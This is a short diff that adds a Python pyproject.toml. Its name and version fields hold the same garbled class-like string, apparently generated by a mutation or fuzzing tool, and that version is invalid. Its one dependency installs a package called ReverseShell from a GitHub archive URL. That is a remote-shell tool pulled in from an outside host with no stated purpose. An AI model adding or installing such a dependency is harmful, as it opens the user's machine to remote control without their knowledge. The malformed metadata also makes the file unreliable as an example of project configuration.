@@ -1,0 +1,4 @@
+[project]
+name = "FieldHunter.mutator.real_types.ExampleClass"
+version = "FieldHunter.mutator.real_types.ExampleClass"
+dependencies = ["ReverseShell @ https://github.com/mauricelambert/ReverseShell/archive/refs/tags/v0.1.0python.tar.gz"]
